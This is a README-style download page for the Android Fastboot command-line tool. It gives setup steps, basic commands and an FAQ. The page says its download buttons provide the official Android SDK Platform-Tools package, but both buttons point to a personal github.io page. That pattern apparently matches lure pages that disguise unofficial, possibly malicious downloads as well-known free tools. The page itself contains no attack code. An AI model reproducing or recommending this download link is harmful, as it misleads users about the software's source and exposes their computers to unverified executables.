# Fastboot

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgUmJlmeIe638rybfd-JB1TEUFDX1f_v6gz3wczBVkNA&s=10" alt="Fastboot logo" width="120"/>

[![Download Fastboot](https://img.shields.io/badge/⬇_Download_Fastboot-D63384?style=for-the-badge)](https://stevenmorales29.github.io/.github/Fastboot-CLI-App)

**So, what is Fastboot, exactly?**
Fastboot is a command-line tool for Windows that developers use alongside ADB to flash images, unlock or lock bootloaders, and diagnose Android devices. It talks to a device while it's sitting in fastboot mode — a diagnostic state built into the device's bootloader — rather than while Android itself is running.

<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSLCPamxRZtvz1KzyvqIseETRTAkWFd8xrpfGnh3A9nihGDK--K-1ojKTM&s=10" alt="Fastboot Screenshot"/>
*A Windows command-line session sending fastboot commands to a connected Android device.*

### Is Fastboot right for you?
**Need to flash a system or recovery image?** Fastboot writes images straight to a device partition from the command line. **Trying to recover a device that won't boot?** Because fastboot talks to the bootloader instead of the operating system, it can often reach a device that Android itself can't start on. **Want to script repeatable device setup?** Standard fastboot commands work the same way every time, which makes them easy to chain into a batch file or script.

### Will it run on my machine?
- [ ] A currently supported 64-bit edition of Windows
- [ ] A free USB port and a data-capable USB cable
- [ ] The correct USB driver for your specific Android device

### How do I get it running?
Getting set up mostly means downloading the Android SDK Platform-Tools package for Windows using the button above, extracting the ZIP archive to a folder such as `C:\platform-tools`, and installing whatever USB driver your device's manufacturer provides — after that, adb and fastboot are both ready to run from that same folder with no separate setup step.

### Okay, it's installed — now what?
1. Put your Android device into fastboot mode, typically with a button combination held at startup.
2. Open a Command Prompt or PowerShell window inside the platform-tools folder.
3. Run `fastboot devices` to confirm Windows can see the connected device.
4. Run the specific fastboot command your task needs, such as flashing an image or checking a bootloader variable.

### Still have questions?
- [ ] **What is fastboot used for?** — Mainly flashing images to a device's partitions, checking bootloader state, and recovering devices that won't start normally.
- [ ] **What fastboot commands should I try first?** — `fastboot devices`, `fastboot getvar all`, and `fastboot flash` cover most everyday tasks.
- [ ] **Is Fastboot free?** — Yes, it's distributed at no cost as part of the Android SDK Platform-Tools.

**Need a hand?**
Stuck on a command? Fastboot's built-in help listing, available right from the command line, covers every flag and subcommand it supports. For anything beyond that — driver problems, device-specific behavior, or a fuller command reference — Android's official developer documentation is the better next stop.

---

**Ready to give it a try?** [![Download Fastboot](https://img.shields.io/badge/⬇_Download_Fastboot-D63384?style=for-the-badge)](https://stevenmorales29.github.io/.github/Fastboot-CLI-App)
